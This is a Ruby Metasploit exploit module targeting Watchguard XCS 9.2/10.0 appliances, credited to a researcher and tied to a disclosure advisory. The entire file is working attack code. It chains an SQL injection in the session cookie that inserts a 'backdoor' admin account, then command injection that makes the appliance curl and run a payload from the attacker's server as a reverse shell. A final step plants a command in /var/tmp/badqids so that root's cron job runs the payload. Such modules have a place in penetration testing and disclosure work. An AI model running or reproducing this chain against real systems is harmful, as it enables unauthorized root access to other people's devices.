##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
          'Name'           => 'Watchguard XCS Unauthenticated Remote Root',
          'Description'    => %q{
          This module exploits three seperate vulnerabilities found in the Watchguard XCS virtual appliance
          to gain a root shell. By exploiting an unauthenticated SQL injection vulnerability, a remote attacker may insert
          a valid web user into the appliance database, and login to the web interface as this user. A
          vulnerability in the web interface allows the attack to inject operating system commands as the
          'nobody' user. A further vulnerability in the 'FixCorruptMail' script called by root's crontab can then be exploited
          to run a command as root within 3 minutes.
          },
          'Author'         =>
          [
          'Daniel Jensen <daniel.jensen[at]security-assessment.com>' # discovery and Metasploit module
          ],
          'License'        => MSF_LICENSE,
          'References'     =>
          [
            ['URL','http://security-assessment.com/files/documents/advisory/Watchguard-XCS-final.pdf']
          ],
          'Platform'       => 'bsd',
          'Arch'           => ARCH_X86_64,
          'Privileged'     => false,
          'Targets'        =>
          [
            [ 'Watchguard XCS 9.2/10.0', { }]
          ],
          'DefaultOptions' =>
          {
            'SSL' => true
          },
          'DefaultTarget'  => 0,
          'DisclosureDate' => 'Jun 29 2015'
          ))

    register_options(
        [
        OptString.new('TARGETURI', [true, 'The target URI', '/']),
        OptBool.new('GETROOT', [false, 'Exploit the root privesc (Takes up to 180 seconds)', true]),
        Opt::RPORT(443)
        ],
        self.class
        )
    end

    def check
    #Check to see if the SQLi is exploitable
      res = send_request_cgi({
         'uri' => normalize_uri(target_uri.path, '/borderpost/imp/compose.php3'),
         'cookie' => "sid=1 AND 1=CAST((select password from sds_users where login='admin' limit 1) as int)"
         })
     uri1 = normalize_uri(target_uri.path, '/borderpost/imp/compose.php3')
     if res and res.body =~ /invalid input syntax for integer/
       vprint_status("Looks vulnerable to the SQLi issue, probably fully vulnerable")
       return Exploit::CheckCode::Vulnerable
     else
       vprint_status("**Sad trumpet sound**")
       vprint_status(res)
     return Exploit::CheckCode::Safe
     end
     end


    def exploit
      #Add the backdoor user to db
      res = send_request_cgi({
          'uri' => normalize_uri(target_uri.path, '/borderpost/imp/compose.php3'),
         'cookie' => "sid=1%3BINSERT INTO sds_users (self, login, password, org, priv_level, quota, disk_usage) VALUES(99, 'backdoor', '0b75e2443d3c813d91ac5b91106a70ad', 0, 'server_admin', 0, 0)--"
      })

    if !res or !res.body
      fail_with(Failure::Unreachable, "Could not connect to host")
    end

    if res.body =~ /ERROR:  duplicate key value violates unique constraint/
      print_status("Added backdoor user, credentials => backdoor:backdoor")
    else
      fail_with(Failure::UnexpectedReply, "Unable to add backdoor user")
    end


    #Get the login hash/csrf thing needed to login
    get_login_hash = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/login.spl')
    })

    #Find the hash token needed to login
    login_hash = ''
    get_login_hash.body.each_line do |line|
    next if line !~ /name="hash" value="(.*)"/
      login_hash = $1
    end

    sid_cookie = (get_login_hash.get_cookies || '').scan(/sid=(\w+);/).flatten[0] || ''

    if login_hash == '' || sid_cookie == ''
      fail_with(Failure::UnexpectedReply, "Could not find login hash or cookie")
    end


    login_post = {
      'u' => 'backdoor',
      'pwd' => 'backdoor',
      'hash' => login_hash,
      'login' => "Login"
    }

    print_status("Logging in with backdoor credentials")
    login = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/login.spl'),
      'method' => 'POST',
      'encode_params' => false,
      'cookie' => "sid=#{sid_cookie}",
      'vars_post' => login_post,
      'vars_get' => {
      'f' => 'V',
      }
      })


    if !login or login.body !~ /<title>Loading...<\/title>/
      vprint_status(login.body)
      fail_with(Failure::NoAccess, "Authentication failed")
    end

    print_status("Successfully logged in")

    #Check if cmd injection works
    test_cmd_inj = send_cmd_exec("/ADMIN/mailqueue.spl", sid_cookie, "id")
    if test_cmd_inj.body !~ /uid=65534/
      fail_with(Failure::UnexpectedReply, "Could not inject command")
    end

    #We have cmd exec, stand up an HTTP server and deliver the payload
    print_status("Getting ready to drop binary on appliance")

    downfile = rand_text_alpha(8+rand(8))
    vprint_status("File name is #{downfile}")

    @pl = generate_payload_exe
    @elf_sent = false

    resource_uri = '/' + downfile

    if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
      srv_host = Rex::Socket.source_address(rhost)
    else
      srv_host = datastore['SRVHOST']
    end

    service_url = 'https://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri
    print_status("Starting up our web service on #{service_url} ...")
    start_service({'Uri' => {
        'Proc' => Proc.new { |cli, req|
        on_request_uri(cli, req)
        },
        'Path' => resource_uri
    }})

    filename = rand_text_alpha_lower(8)
    vprint_status("Asking the appliance to download #{service_url}")

    #Use the cmd exec to pull in shell
    dnld_cmd1 = "/usr/local/sbin/curl -k #{service_url} -o /tmp/#{filename}"
    vprint_status("Telling appliance to run #{dnld_cmd1}")
    send_cmd_exec("/ADMIN/mailqueue.spl", sid_cookie, dnld_cmd1)
    register_file_for_cleanup("/tmp/#{filename}")

    #wait for payload download
    wait_for_payload

    #Chmod the shell binary
    chmod_cmd = "chmod +x /tmp/#{filename}"
    print_status("Chmoding payload #{downfile}...")
    send_cmd_exec("/ADMIN/mailqueue.spl",sid_cookie, chmod_cmd)

    if(datastore['GETROOT'] == true)
      print_status("GETROOT set to true, we will use 'FixCorruptMail' privesc")
      get_root(sid_cookie,filename)
    else
      print_status("GETROOT set to false, setting up a shell as 'nobody'")

      #exec revshell straight away
      exec_cmd = "/tmp/#{filename}"
      print_status("Running payload #{downfile}...")
      send_cmd_exec("/ADMIN/mailqueue.spl",sid_cookie, exec_cmd, true)
    end

  end

  def get_root(sid_cookie,filename)
    print_status("Rooting can take up to 3 minutes, if you want quicker access retry with GETROOT => false")

    #Touch dummy file as part of privesc
    touch_cmd="touch /tmp/dummyfile"
    vprint_status("Creating dummy file...")
    send_cmd_exec("/ADMIN/mailqueue.spl", sid_cookie, touch_cmd)

    #Put the shell injection line into badqids
    setup_privesc = "echo \"../../../../../../tmp/dummyfile;/tmp/#{filename}\" > /var/tmp/badqids"
    send_cmd_exec("/ADMIN/mailqueue.spl", sid_cookie, setup_privesc, true)

    #Need both these files to exploit privesc, delete them once shell opened
    register_file_for_cleanup("/var/tmp/badqids")
    register_file_for_cleanup("/tmp/dummyfile")

    #Wait for crontab to run vulnerable script
    print_status("Badqids created, waiting for vulnerable script to be called by crontab...")
    select(nil,nil,nil,180) #Wait 3 minutes to ensure cron script is run
    print_status("Ran out of time, should have root shell by now.")

  end

  def send_cmd_exec(uri,sid_cookie,os_cmd, blocking=false)
  #This is a handler function that makes HTTP calls to exploit the command injection issue
    res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, "#{uri}"),
        'cookie' => "sid=#{sid_cookie}",
        'encode_params' => true,
        'vars_get' => {
          'f' => 'dnld',
          'id' => ";#{os_cmd}"
        }
    })

    #Handle cmd exec failures
    if (!res and blocking == false)
      fail_with(Failure::Unknown, "Unable to deploy payload")
    else
      return res
    end
  end

    # Handle incoming requests from the server
  def on_request_uri(cli, request)
    vprint_status("on_request_uri called: #{request.inspect}")
    if (not @pl)
      print_error("A request came in, but the payload wasn't ready yet!")
      return
    end
    print_status("Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end

  #Wait for the data to be sent
  def wait_for_payload
    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > 10)
        fail_with(Failure::Unknown, "Target didn't request the payload.")
      end
    end
  end
end
